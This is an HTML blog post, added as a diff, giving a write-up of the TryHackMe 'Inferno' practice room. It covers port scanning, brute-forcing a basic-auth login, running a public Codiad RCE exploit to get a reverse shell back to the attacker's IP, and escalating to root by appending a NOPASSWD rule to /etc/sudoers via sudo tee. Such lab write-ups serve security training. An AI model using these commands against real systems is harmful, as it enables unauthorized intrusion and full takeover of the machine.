@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="en">
+
+    <meta name="author" content="d4rkn1gh7 | Balaji Anandhan">
+    <meta name="description" content="Writeup of Inferno Room">
+    <meta name="keywords" content="blog,ctf,hacking,coding">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Inferno TryHackMe Writeup"/>
+<meta name="twitter:description" content="Writeup of Inferno Room"/>
+
+    <meta property="og:title" content="Inferno TryHackMe Writeup" />
+<meta property="og:description" content="Writeup of Inferno Room" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/inferno/" />
+<meta property="article:published_time" content="2021-02-21T17:41:36+05:30" />
+<meta property="article:modified_time" content="2021-02-21T17:41:36+05:30" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/enpass/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/archangel/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/madeyescastle/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/cyborg/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/sustah/" />
+
+
+
+    <title>
+  Inferno TryHackMe Writeup · d4rkn1gh7 | Tech Blog
+</title>
+
+    
+      <link rel="canonical" href="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/inferno/">
+    
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.1.7/css/fork-awesome.min.css"
+      integrity="sha256-gsmEoJAws/Kd3CjuOQzLie5Q3yshhvmo7YNtBG7aaEY=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8/normalize.min.css">
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.f01c647a0d25b40da992a37c3376291185eed8a50ced8c26cc2c0bcfe38c97df.css" integrity="sha256-8Bxkeg0ltA2pkqN8M3YpEYXu2KUM7YwmzCwLz&#43;OMl98=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+      
+        
+        
+        <link rel="stylesheet" href="/css/coder-dark.min.126ad3988d46bdae6217a11105b53c9662bca05f39d42d3c0fb366919d334620.css" integrity="sha256-EmrTmI1Gva5iF6ERBbU8lmK8oF851C08D7NmkZ0zRiA=" crossorigin="anonymous" media="screen" />
+      
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+    
+      <script defer src="https://twemoji.maxcdn.com/v/13.0.1/twemoji.min.js"
+        integrity="sha384-5f4X0lBluNY/Ib4VhGx0Pf6iDCF99VGXJIyYy7dDLY5QlEd7Ap0hICSSZA1XYbc4" crossorigin="anonymous"></script>
+    
+
+    <meta name="generator" content="Hugo 0.80.0" />
+  </head>
+
+  
+  
+    
+  
+  <body class="colorscheme-auto"
+        onload=" twemoji.parse(document.body); "
+  >
+    
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      d4rkn1gh7 | Tech Blog
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">Posts</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/tryhackme">TryHackMe</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/hackthebox">HackTheBox</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/codinglinux">Coding | Linux</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/tags/">Tags</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">Inferno TryHackMe Writeup</h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime='2021-02-21T17:41:36&#43;05:30'>
+                February 21, 2021
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa fa-clock-o" aria-hidden="true"></i>
+              5-minute read
+            </span>
+          </div>
+          <div class="authors">
+    <i class="fa fa-user" aria-hidden="true"></i>
+      <a href="/authors/d4rkn1gh7/">d4rkn1gh7</a></div>
+          <div class="categories">
+  <i class="fa fa-folder" aria-hidden="true"></i>
+    <a href="/categories/tryhackme/">TryHackMe</a></div>
+
+          <div class="tags">
+  <i class="fa fa-tag" aria-hidden="true"></i>
+    <a href="/tags/ctf/">ctf</a>
+      <span class="separator">•</span>
+    <a href="/tags/thm/">thm</a>
+      <span class="separator">•</span>
+    <a href="/tags/medium_box/">medium_box</a></div>
+
+        </div>
+      </header>
+
+      <div>
+        
+        <h1 id="inferno-tryhackme-writeup">Inferno TryHackMe Writeup</h1>
+<blockquote>
+<p>Room link : <a href="https://tryhackme.com/room/inferno">https://tryhackme.com/room/inferno</a></p>
+</blockquote>
+<p><img src="/TryHackMe/Inferno/BoxImage.png" alt=""></p>
+<h3 id="pathway">Pathway</h3>
+<p>In this room first we bruteforce http login , then we find a public rce exploit and gain foothold and then with the help of a hidden file we gain user acccess. Then with sudo rights we gain root access.</p>
+<h2 id="__first-stage--enumeration__"><strong>First Stage : Enumeration</strong></h2>
+<p>Let&rsquo;s start with nmap scan.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Nmap 7.91 scan initiated Fri Feb 19 21:53:19 2021 as: nmap -sC -sV -T4 -vv -p- -oN nmapscan 10.10.190.142
+Nmap scan report for 10.10.190.142
+Host is up, received syn-ack (0.15s latency).
+Scanned at 2021-02-19 21:53:19 IST for 2286s
+Not shown: 65445 closed ports
+Reason: 65445 conn-refused
+PORT      STATE SERVICE           REASON  VERSION
+21/tcp    open  ftp?              syn-ack
+22/tcp    open  ssh               syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d7:ec:1a:7f:62:74:da:29:64:b3:ce:1e:e2:68:04:f7 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBR1uDh8+UHIoUl3J5AJApSgrmxFtvWtauxjTLxH9B5s9E0SThz3fljXo7uSL+2hjphfHyqrdAxoCGQJgRn/o5xGDSpoSoORBIxv1LVaZJlt/eIEhjDP48NP9l/wTRki9zZl5sNVyyyy/lobAj6BYH+dU3g++2su9Wcl0wmFChG5B2Kjrd9VSr6TC0XJpGfQxu+xJy29XtoTzKEiZCoLz3mZT7UqwsSgk38aZjEMKP9QDc0oa5v4JmKy4ikaR90CAcey9uIq8YQtSj+US7hteruG/HLo1AmOn9U3JAsVTd4vI1kp+Uu2vWLaWWjhfPqvbKEV/fravKSPd0EQJmg1eJ
+|   256 de:4f:ee:fa:86:2e:fb:bd:4c:dc:f9:67:73:02:84:34 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKFhVdH50NAu45yKvSeeMqyvWl1aCZ1wyrHw2MzGY5DVosjZf/rUzrdDRS0u9QoIO4MpQAvEi7w7YG7zajosRN8=
+|   256 e2:6d:8d:e1:a8:d0:bd:97:cb:9a:bc:03:c3:f8:d8:85 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAdzynTIlsSkYKaqfCAdSx5J2nfdoWFw1FcpKFIF8LRv
+23/tcp    open  telnet?           syn-ack
+25/tcp    open  smtp?             syn-ack
+|_smtp-commands: Couldn&#39;t establish connection on port 25
+80/tcp    open  http              syn-ack Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: HEAD GET POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Dante&#39;s Inferno
+88/tcp    open  kerberos-sec?     syn-ack
+106/tcp   open  pop3pw?           syn-ack
+110/tcp   open  pop3?             syn-ack
+194/tcp   open  irc?              syn-ack
+|_irc-info: Unable to open connection
+389/tcp   open  ldap?             syn-ack
+443/tcp   open  https?            syn-ack
+464/tcp   open  kpasswd5?         syn-ack
+636/tcp   open  ldapssl?          syn-ack
+750/tcp   open  kerberos?         syn-ack
+775/tcp   open  entomb?           syn-ack
+777/tcp   open  multiling-http?   syn-ack
+779/tcp   open  unknown           syn-ack
+783/tcp   open  spamassassin?     syn-ack
+808/tcp   open  ccproxy-http?     syn-ack
+873/tcp   open  rsync?            syn-ack
+1001/tcp  open  webpush?          syn-ack
+1178/tcp  open  skkserv?          syn-ack
+1210/tcp  open  eoss?             syn-ack
+1236/tcp  open  bvcontrol?        syn-ack
+1300/tcp  open  h323hostcallsc?   syn-ack
+1313/tcp  open  bmc_patroldb?     syn-ack
+1314/tcp  open  pdps?             syn-ack
+1529/tcp  open  support?          syn-ack
+2000/tcp  open  cisco-sccp?       syn-ack
+2003/tcp  open  finger?           syn-ack
+|_finger: ERROR: Script execution failed (use -d to debug)
+2121/tcp  open  ccproxy-ftp?      syn-ack
+2150/tcp  open  dynamic3d?        syn-ack
+2600/tcp  open  zebrasrv?         syn-ack
+2601/tcp  open  zebra?            syn-ack
+2602/tcp  open  ripd?             syn-ack
+2603/tcp  open  ripngd?           syn-ack
+2604/tcp  open  ospfd?            syn-ack
+2605/tcp  open  bgpd?             syn-ack
+2606/tcp  open  netmon?           syn-ack
+2607/tcp  open  connection?       syn-ack
+2608/tcp  open  wag-service?      syn-ack
+2988/tcp  open  hippad?           syn-ack
+2989/tcp  open  zarkov?           syn-ack
+4224/tcp  open  xtell?            syn-ack
+4557/tcp  open  fax?              syn-ack
+4559/tcp  open  hylafax?          syn-ack
+4600/tcp  open  piranha1?         syn-ack
+4949/tcp  open  munin?            syn-ack
+5051/tcp  open  ida-agent?        syn-ack
+5052/tcp  open  ita-manager?      syn-ack
+5151/tcp  open  esri_sde?         syn-ack
+5354/tcp  open  mdnsresponder?    syn-ack
+5355/tcp  open  llmnr?            syn-ack
+5432/tcp  open  postgresql?       syn-ack
+5555/tcp  open  freeciv?          syn-ack
+5666/tcp  open  nrpe?             syn-ack
+5667/tcp  open  unknown           syn-ack
+5674/tcp  open  hyperscsi-port?   syn-ack
+5675/tcp  open  v5ua?             syn-ack
+5680/tcp  open  canna?            syn-ack
+6346/tcp  open  gnutella?         syn-ack
+6514/tcp  open  syslog-tls?       syn-ack
+6566/tcp  open  sane-port?        syn-ack
+6667/tcp  open  irc?              syn-ack
+|_irc-info: Unable to open connection
+8021/tcp  open  ftp-proxy?        syn-ack
+8081/tcp  open  blackice-icecap?  syn-ack
+|_mcafee-epo-agent: ePO Agent not found
+8088/tcp  open  radan-http?       syn-ack
+8990/tcp  open  http-wmap?        syn-ack
+9098/tcp  open  unknown           syn-ack
+9359/tcp  open  unknown           syn-ack
+9418/tcp  open  git?              syn-ack
+9673/tcp  open  unknown           syn-ack
+10000/tcp open  snet-sensor-mgmt? syn-ack
+10081/tcp open  famdc?            syn-ack
+10082/tcp open  amandaidx?        syn-ack
+10083/tcp open  amidxtape?        syn-ack
+11201/tcp open  smsqp?            syn-ack
+15345/tcp open  xpilot?           syn-ack
+17001/tcp open  unknown           syn-ack
+17002/tcp open  unknown           syn-ack
+17003/tcp open  unknown           syn-ack
+17004/tcp open  unknown           syn-ack
+20011/tcp open  unknown           syn-ack
+20012/tcp open  ss-idi-disc?      syn-ack
+24554/tcp open  binkp?            syn-ack
+27374/tcp open  subseven?         syn-ack
+30865/tcp open  unknown           syn-ack
+57000/tcp open  unknown           syn-ack
+60177/tcp open  unknown           syn-ack
+60179/tcp open  unknown           syn-ack
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+</code></pre></div><p>Since there are too many open ports , I started with port 80.</p>
+<p><img src="/TryHackMe/Inferno/port80.png" alt=""></p>
+<p>So let&rsquo;s use gobuster to find directories.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.175.108/
+[+] Threads:        50
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     js,txt,html,php,json
+[+] Timeout:        10s
+===============================================================
+2021/02/18 16:50:00 Starting gobuster
+===============================================================
+/index.html (Status: 200)
+/inferno (Status: 401)
+</code></pre></div><h2 id="__second-stage--initial-access-as-www-data__"><strong>Second Stage : Initial access as www-data</strong></h2>
+<p>Hence we found the directory inferno , I visited it but it was protected with Basic Authentication . Hence I had a doubt on the image which was present in the home page , I downloaded it but found nothing.</p>
+<p>I tried enumerating smtp , ftp and other ports but nothing interesting came.</p>
+<p>Hence I tried bruteforcing the login using hydra.</p>
+<p>So I created a user list .</p>
+<p><img src="/TryHackMe/Inferno/users.png" alt=""></p>
+<p>Using hydra I bruteforced.</p>
+<p><img src="/TryHackMe/Inferno/hydra.png" alt=""></p>
+<p>So if we login  we can see another login page.</p>
+<p><img src="/TryHackMe/Inferno/login1.png" alt=""></p>
+<p>I used the same username and pass , it worked.</p>
+<p><img src="/TryHackMe/Inferno/ide.png" alt=""></p>
+<p>Hence this is the web server which is running . I tried editing php files for reverse shell , but we don&rsquo;t have write permissions. Hence I the name of this IDE was in the title which is <strong>Codiad</strong>.</p>
+<p>I searched for public exploits and found this RCE exploit.</p>
+<p>Exploit link : <a href="https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit">https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit</a></p>
+<p>I cloned it and used the program .</p>
+<blockquote>
+<p>python exploit.py http://admin:dante1@10.10.4.111/inferno/  admin dante1 &lt;your-ip&gt; 1234 linux</p>
+</blockquote>
+<p><img src="/TryHackMe/Inferno/exploit.png" alt=""></p>
+<p>Follow the commands given in that exploit and execute it.</p>
+<p>We get reverse shell.</p>
+<p>For some reason the shell was not stable and I was losing connection , hence follow these steps.</p>
+<p><img src="/TryHackMe/Inferno/www-data.png" alt=""></p>
+<h2 id="__third-stage--www-data-to-dante__"><strong>Third Stage : www-data to dante</strong></h2>
+<p>In the downloads directory there was a hidden file called <strong>.download.dat</strong></p>
+<p><img src="/TryHackMe/Inferno/down.png" alt=""></p>
+<p>I used  CyberChef to decode and we get the password.</p>
+<p><img src="/TryHackMe/Inferno/sshpass.png" alt=""></p>
+<p>So now we can ssh into the machine and get flag.</p>
+<p><img src="/TryHackMe/Inferno/dante.png" alt=""></p>
+<p>For some reason the ssh connection was getting lost. So type /bin/sh or sh to get a stable shell.</p>
+<h2 id="__fourth-stage--dante-to-root__"><strong>Fourth Stage : dante to root</strong></h2>
+<p>So  I tried sudo -l.</p>
+<p><img src="/TryHackMe/Inferno/perm.png" alt=""></p>
+<p>So I searched this in <a href="https://gtfobins.github.io/">GTFOBins</a> and got this.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">LFILE=file_to_write
+echo DATA | sudo tee -a &#34;$LFILE&#34;
+</code></pre></div><p>So for exploit we do this</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">LFILE=/etc/sudoers
+echo &#34;dante  ALL=(ALL) NOPASSWD:ALL&#34; | sudo tee -a &#34;$LFILE&#34;
+</code></pre></div><p>This gives user dante the permission to execute anything without password.</p>
+<p><img src="/TryHackMe/Inferno/root.png" alt=""></p>
+<p>Hence we rooted!.</p>
+
+      </div>
+
+
+      <footer>
+        
+
+<section class="see-also">
+  
+    
+    
+    
+      <h3>See also in TryHackMe</h3>
+      <nav>
+        <ul>
+        
+        
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/enpass/">Enpass TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/archangel/">Archangel TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/madeyescastle/">Madeye&#39;s Castle TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/cyborg/">Cyborg TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/sustah/">Sustah TryHackMe Writeup</a>
+            </li>
+          
+        
+        </ul>
+      </nav>
+    
+  
+</section>
+
+
+        <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "yourdiscussshortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+      </div>
+
+      
+  <footer class="footer">
+    <section class="container">
+      
+        <p>Hack The Planet!</p>
+      
+      
+        ©
+        
+          2019 -
+        
+        2021
+         d4rkn1gh7 | Balaji Anandhan 
+      
+      
+      
+        
+      
+    </section>
+  </footer>
+
+
+    </main>
+
+    
+      
+        
+        <script src="/js/dark-mode.min.0213e1773e6d1c5a644f847c67a6f8abac49a3776e2976f6008038af8c5b76a1.js"></script>
+      
+    
+
+    
+
+    
+
+    <script>
+(function(f, a, t, h, o, m){
+	a[h]=a[h]||function(){
+		(a[h].q=a[h].q||[]).push(arguments)
+	};
+	o=f.createElement('script'),
+	m=f.getElementsByTagName('script')[0];
+	o.async=1; o.src=t; o.id='fathom-script';
+	m.parentNode.insertBefore(o,m)
+})(document, window, '//analytics.example.com/tracker.js', 'fathom');
+fathom('set', 'siteId', 'ABCDE');
+fathom('trackPageview');
+</script>
+
+
+    <script async defer data-domain="example.com" src="https://analytics.example.com/js/plausible.js"></script>
+
+
+    <script data-goatcounter="https://code.goatcounter.com/count"
+        async src="//gc.zgo.at/count.js"></script>
+
+
+    
+<script defer src='https://static.cloudflareinsights.com/beacon.min.js'
+        data-cf-beacon='{"token": "token"}'></script>
+
+
+  </body>
+
+</html>
